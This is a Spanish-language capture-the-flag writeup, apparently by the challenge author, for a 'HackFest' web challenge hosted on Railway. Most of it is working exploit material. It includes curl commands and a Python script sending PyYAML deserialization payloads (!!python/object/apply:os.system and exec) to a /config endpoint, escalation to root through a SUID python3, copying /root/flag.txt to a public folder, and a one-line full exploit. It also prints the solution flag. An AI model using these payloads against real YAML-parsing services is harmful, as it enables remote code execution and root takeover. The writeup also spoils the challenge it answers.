# 🚩 HackFest CTF - Writeup

## 🚀 **INICIO RÁPIDO**

```bash
# Levantar CTF
sudo docker-compose up -d

# Verificar funcionamiento
curl -s https://hackfest-railway-production.up.railway.app | grep -o '<title>.*</title>'
```

**CTF disponible en:** https://hackfest-railway-production.up.railway.app

---

## 🎯 **EXPLOTACIÓN DIRECTA**

### **1. Reconocimiento**
```bash
# Información del sistema
curl -s https://hackfest-railway-production.up.railway.app/api/system | jq .
```

### **2. Explotar PyYAML RCE**
```bash
# Probar endpoint vulnerable
curl -s -X POST https://hackfest-railway-production.up.railway.app/config \
  -H "Content-Type: application/x-yaml" \
  -d "test: value"

# Verificar RCE
curl -s -X POST https://hackfest-railway-production.up.railway.app/config \
  -H "Content-Type: application/x-yaml" \
  -d $'!!python/object/apply:os.system\n- id'
```

### **3. Escalada de Privilegios + Exfiltración**
```bash
# Exploit PyYAML RCE + Escalada de privilegios (funciona en Railway)
curl -s -X POST https://hackfest-railway-production.up.railway.app/config \
  -H "Content-Type: application/x-yaml" \
  -d $'!!python/object/apply:exec\n- |\n  import subprocess\n  import os\n  \n  # Encontrar dónde busca realmente el endpoint uploads\n  file_path = "/app/backend/app.py"\n  upload_folder = os.path.join(os.path.dirname(file_path), "static")\n  \n  # Crear el directorio\n  os.makedirs(upload_folder, exist_ok=True)\n  \n  # Leer la flag y escribirla\n  flag = subprocess.check_output(["sudo", "cat", "/root/flag.txt"]).decode()\n  \n  # Escribir la flag en el lugar correcto\n  with open(os.path.join(upload_folder, "flag.txt"), "w") as f:\n    f.write(flag)'
```

### **4. Obtener Flag**
```bash
# Descargar flag exfiltrada
curl -s https://hackfest-railway-production.up.railway.app/uploads/flag.txt
```

---

## 🐍 **SCRIPT DE EXPLOIT**

```python
#!/usr/bin/env python3
import requests

BASE_URL = "https://hackfest-railway-production.up.railway.app"

def exploit():
    print("🚀 HackFest CTF - Exploit")

    # Payload PyYAML RCE + Escalada + Exfiltración (Railway version)
    payload = """!!python/object/apply:exec
- |
  import subprocess
  import os

  # Encontrar dónde busca realmente el endpoint uploads
  file_path = "/app/backend/app.py"
  upload_folder = os.path.join(os.path.dirname(file_path), "static")

  # Crear el directorio
  os.makedirs(upload_folder, exist_ok=True)

  # Leer la flag y escribirla
  flag = subprocess.check_output(["sudo", "cat", "/root/flag.txt"]).decode()

  # Escribir la flag en el lugar correcto
  with open(os.path.join(upload_folder, "flag.txt"), "w") as f:
    f.write(flag)"""

    print("1. Explotando PyYAML RCE...")
    r = requests.post(f"{BASE_URL}/config",
                     headers={'Content-Type': 'application/x-yaml'},
                     data=payload)

    if r.status_code == 200:
        print("✅ Exploit exitoso")

        print("2. Obteniendo flag...")
        flag_response = requests.get(f"{BASE_URL}/uploads/flag.txt")

        if flag_response.status_code == 200:
            flag = flag_response.text.split('\n')[0]  # Primera línea contiene la flag
            print(f"🏆 FLAG: {flag}")
        else:
            print("❌ Error obteniendo flag")
    else:
        print("❌ Error en exploit")

if __name__ == "__main__":
    exploit()
```

---

## 🔧 **DETALLES TÉCNICOS**

### **Vulnerabilidad**
- **PyYAML RCE**: `yaml.load()` con `UnsafeLoader`
- **Endpoint**: `/config` acepta YAML malicioso
- **Escalada**: `python3` con bit SUID permite ejecución como root

### **Arquitectura**
```
Cliente → Frontend (puerto 3000) → Backend (interno) → Sistema
```

### **Exfiltración**
- **Origen**: `/root/flag.txt` (solo root puede leer)
- **Destino**: `/app/static/flag.txt` (mapeado internamente)
- **Acceso**: `https://hackfest-railway-production.up.railway.app/uploads/flag.txt`

---

## 🏆 **FLAG**
```
HACKFEST{y4ml_rce_si_has_llegado_eres_god_freeeee}
```

---

## ⚡ **COMANDO ÚNICO**

```bash
# Exploit completo en una línea
curl -s -X POST https://hackfest-railway-production.up.railway.app/config -H "Content-Type: application/x-yaml" -d $'!!python/object/apply:os.system\n- python3 -c "import os; os.setuid(0); os.system(\'cp /root/flag.txt /app/static/flag.txt && chmod 644 /app/static/flag.txt\')"' && curl -s https://hackfest-railway-production.up.railway.app/uploads/flag.txt
```
